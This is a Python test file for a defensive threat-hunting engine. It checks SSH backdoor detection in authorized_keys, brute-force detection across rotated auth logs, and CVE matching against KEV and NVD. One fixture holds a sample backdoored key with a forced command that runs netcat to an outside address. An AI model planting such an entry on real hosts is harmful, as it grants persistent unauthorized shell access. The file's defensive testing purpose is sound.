"""كشف أبواب SSH وترتيب السجلات ومطابقة KEV وNVD."""

class _Files:
    def __init__(self, files):
        self.files = files

    def glob(self, _pattern):
        return [path for path in self.files if path.startswith("/home/")]

    def is_file(self, path):
        return path in self.files

    def read_text(self, path):
        return self.files[path]

    def run_cmd(self, _args):
        return False, "", ""


def test_authorized_keys_command_not_at_start():
    from engine.hunter import ThreatHunter

    path = "/home/user/.ssh/authorized_keys"
    reader = _Files({
        path: 'restrict,command="bash -c \\"nc 10.0.0.5 4444\\"" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAItest attacker\n'
    })
    findings = ThreatHunter(reader).check_authorized_keys()
    assert findings
    assert findings[0]["severity"] == "critical"
    assert "nc" in findings[0]["detail"]


def test_plain_key_is_not_a_forced_command():
    from engine.hunter import ThreatHunter

    path = "/root/.ssh/authorized_keys"
    reader = _Files({path: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAItest laptop\n"})
    assert ThreatHunter(reader).check_authorized_keys() == []


def test_rotated_log_failure_then_current_success():
    from engine.logforensics import LogForensicsEngine

    reader = _Files({
        "/var/log/auth.log.1": "\n".join(
            "Failed password for root from 2001:db8::5 port 22" for _ in range(4)
        ),
        "/var/log/auth.log": "Accepted password for root from 2001:db8::5 port 22",
    })
    findings = LogForensicsEngine(reader).analyze_auth_logs()
    assert any(item["severity"] == "critical" and "2001:db8::5" in item["title"] for item in findings)


def test_kev_name_match_is_exact_not_substring():
    from tools.web import match_package_to_kev

    entries = [
        {"cve_id": "CVE-1", "product": "OpenSSH"},
        {"cve_id": "CVE-2", "product": "ssh"},
        {"cve_id": "CVE-3", "product": "ssl"},
    ]
    openssh = match_package_to_kev("openssh-server", entries)
    libssl = match_package_to_kev("libssl3", entries)
    assert [item["cve_id"] for item in openssh] == ["CVE-1"]
    assert libssl == []


def test_nvd_cpe_version_range_and_name_only():
    from tools.web import match_package_to_nvd

    records = [{
        "id": "CVE-2024-6387",
        "severity": "CRITICAL",
        "description": "OpenSSH race",
        "cpe": [{
            "vendor": "openbsd",
            "product": "openssh",
            "version": "*",
            "start_incl": "8.5",
            "start_excl": None,
            "end_incl": None,
            "end_excl": "9.8",
        }],
    }, {
        "id": "CVE-OTHER",
        "severity": "HIGH",
        "description": "mentions openssl in prose only",
        "cpe": [{
            "vendor": "openssl",
            "product": "openssl",
            "version": "*",
            "start_incl": None,
            "start_excl": None,
            "end_incl": None,
            "end_excl": None,
        }],
    }]
    hit = match_package_to_nvd("openssh-server", "1:9.6p1-3", records)
    miss = match_package_to_nvd("nginx", "1.24", records)
    name_only = match_package_to_nvd("openssl", "", records)
    assert hit and hit[0]["id"] == "CVE-2024-6387" and hit[0]["match"] == "version"
    assert miss == []
    assert name_only and name_only[0]["match"] == "name"
